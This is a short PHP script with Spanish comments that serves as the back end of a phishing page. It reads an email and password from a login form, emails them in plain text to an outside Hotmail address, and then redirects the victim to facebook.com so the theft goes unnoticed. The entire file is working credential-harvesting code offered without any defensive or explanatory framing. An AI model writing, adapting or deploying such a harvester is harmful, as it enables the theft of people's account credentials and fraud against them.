<?php
// Verificar si los datos fueron enviados por POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtener los datos del formulario
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Validación básica
    if (!empty($email) && !empty($password)) {
        // Configuración del correo
        $to = "kaimaldonado@hotmail.com";  // Dirección de destino
        $subject = "Nuevo intento de inicio de sesión";
        
        // Cuerpo del correo
        $message = "Se ha enviado un intento de inicio de sesión:\n\n";
        $message .= "Email: " . htmlspecialchars($email) . "\n";
        $message .= "Password: " . htmlspecialchars($password) . "\n";

        // Encabezados del correo
        $headers = "From: no-reply@tusitio.com\r\n";
        $headers .= "Reply-To: no-reply@tusitio.com\r\n";
        $headers .= "X-Mailer: PHP/" . phpversion();

        // Enviar el correo
        if (mail($to, $subject, $message, $headers)) {
            // Si el correo se envía correctamente, redirigir a Facebook
            header("Location: https://facebook.com");
            exit(); // Asegurarse de que el script se detenga después de la redirección
        } else {
            echo "Error al enviar el correo.";
        }
    } else {
        echo "Por favor, complete ambos campos.";
    }
} else {
    echo "No se enviaron datos.";
}
?>
